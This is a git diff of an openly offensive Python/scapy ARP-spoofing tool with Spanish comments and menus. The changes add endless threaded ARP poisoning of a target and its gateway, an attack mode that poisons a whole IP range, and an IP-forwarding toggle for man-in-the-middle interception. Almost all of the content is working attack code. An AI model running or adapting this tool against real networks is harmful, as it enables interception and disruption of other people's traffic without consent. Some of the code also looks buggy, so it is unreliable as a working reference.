@@ -1,4 +1,6 @@
 import os
+import threading
+import ipaddress
 from scapy.all import * 
 from multiprocessing import Process
 
@@ -35,8 +37,9 @@ def getmac(interface):
   return mac[0:17]
 
 def enviarPaquete(paqueteARP):
-	print("Enviando paquetes ARP a " + paqueteARP[ARP].pdst + " con MAC " + paqueteARP[Ether].dst)
-	sendp(paqueteARP*2000,inter=1)
+	enviar=True
+	while enviar:
+		sendp(paqueteARP*2000,inter=1)
 
 
 def arpPoissoningSoloIP(IP_OBJETIVO,IP_GATEWAY):
@@ -51,16 +54,13 @@ def arpPoissoningSoloIP(IP_OBJETIVO,IP_GATEWAY):
 	p1=buildPacket(mac_propia,mac_objetivo,IP_GATEWAY,IP_OBJETIVO)
 	p2=buildPacket(mac_propia,mac_gateway,IP_OBJETIVO,IP_GATEWAY)
 
-	#Enviamos los paquetes para envenenar las tablas
-	#Creamos 2 procesos para enviar paquetes en paralelo
-
-	enviar=True
-	while enviar:
-		proceso=Process(target=enviarPaquete, args=(p1,))
-		proceso.start()
-		proceso2=Process(target=enviarPaquete, args=(p2,))
-		proceso2.start()
+	print("Enviando paquetes ARP a " + p1[ARP].pdst + " con MAC " + p1[Ether].dst)
+	print("Enviando paquetes ARP a " + p2[ARP].pdst + " con MAC " + p2[Ether].dst)
 	
+	h1=threading.Thread(target=enviarPaquete, args=(p1))
+	h1.start()
+	h2=threading.Thread(target=enviarPaquete, args=(p2))
+	h2.start()
 
 def arpPoissoning(IP_OBJETIVO,IP_GATEWAY,mac_propia,mac_objetivo,mac_gateway):
 	#Creamos los paquetes que se enviaran para envenenar las tablas ARP
@@ -73,6 +73,11 @@ def arpPoissoning(IP_OBJETIVO,IP_GATEWAY,mac_propia,mac_objetivo,mac_gateway):
 	sendp(p2*1000,inter=1)
 
 
+def arpPoisoningLista(lista,ipGateway):
+	for ip in lista:
+		os.system("clear")
+		arpPoissoningSoloIP(ip,ipGateway)
+
 def buildPacket(MAC_PROPIA,MAC_OBJETIVO,IP_GATEWAY,IP_OBJETIVO):
 	p=Ether()/ARP()
 	p[Ether].dst=MAC_OBJETIVO
@@ -84,45 +89,67 @@ def buildPacket(MAC_PROPIA,MAC_OBJETIVO,IP_GATEWAY,IP_OBJETIVO):
 	p[ARP].pdst=IP_OBJETIVO
 	return p
 
+def ips(start, end):
+    	import socket, struct
+    	start = struct.unpack('>I', socket.inet_aton(start))[0]
+    	end = struct.unpack('>I', socket.inet_aton(end))[0]
+	return [socket.inet_ntoa(struct.pack('>I', i)) for i in range(start, end+1)]
+
+#    return ipaddress_list
+
+#MENU
 def menuForwarding():
-	print("0)Sin Forwarding")
-	print("1)Con Forwarding")
+	os.system("clear")
+	print("\n")
+	print("1)Sin Forwarding")
+	print("2)Con Forwarding")
 	teclado = input()
 
-	if  (teclado == 0):
+	if  (teclado == 1):
 		cambiar_fw(0)
 		print("Desactivando Forwarding")
-	elif (teclado == 1):
+	elif (teclado == 2):
 		cambiar_fw(1)
 		print("Activando Forwarding") 
+	else:
+		print("Opcion no valida")
+		time.sleep(2)
+		menuForwarding()
 
 def menu():
+	os.system("clear")
+	menuForwarding()
 	ip_obj=	raw_input("Introduce la IP de objetivo \n")
 	ip_gate= raw_input("Introduce la IP del gateway \n")
 	arpPoissoningSoloIP(ip_obj,ip_gate)
 
 #No usado
-def menuCapa():
-	print("0)Capa 2")
-	print("1)Capa 3")
+def menuGeneral():
+	os.system("clear")
+	print(" \n\n ")
+	print("..................................ARPSPOOF.................................. \n \n ")
+	print("                                                    Pedro Jose Gomez Garrido\n \n \n ")
+	print("Elija tipo de ataque: \n ")
+	print("1)IP simple")
+	print("2)Rango IP")
 	teclado = input()
 	salir=False
 
-	if  (teclado == 0):
-		ip_obj=	raw_input("Introduce la IP de objetivo:")
-		ip_gate= raw_input("Introduce la IP del gateway:")
-		arpPoissoningSoloIP(ip_obj,ip_gate)
+	if  (teclado == 1):
+		menu()
 		
-		
-	elif (teclado == 1):
-		print("Saliendo")
-		
+	elif (teclado == 2):
+		ip_inicio=	raw_input("Introduce la IP inicial \n")
+		ip_fin= raw_input("Introduce la IP final \n")
+		ip_gat= raw_input("Introduce la IP del gateway \n")
+		ipl=ips(ip_inicio,ip_fin)
+		print(ipl)
+		arpPoisoningLista(ipl,ip_gat)
+		#listaIP=ipRange(ip_inicio,ip_fin)
 	else:
-		print("Entrada Incorrecta")
+		print("Opcion no valida")
+		time.sleep(2)
+		menuGeneral()
 
 
-
-menuForwarding()
-menu()
-
-
+menuGeneral()
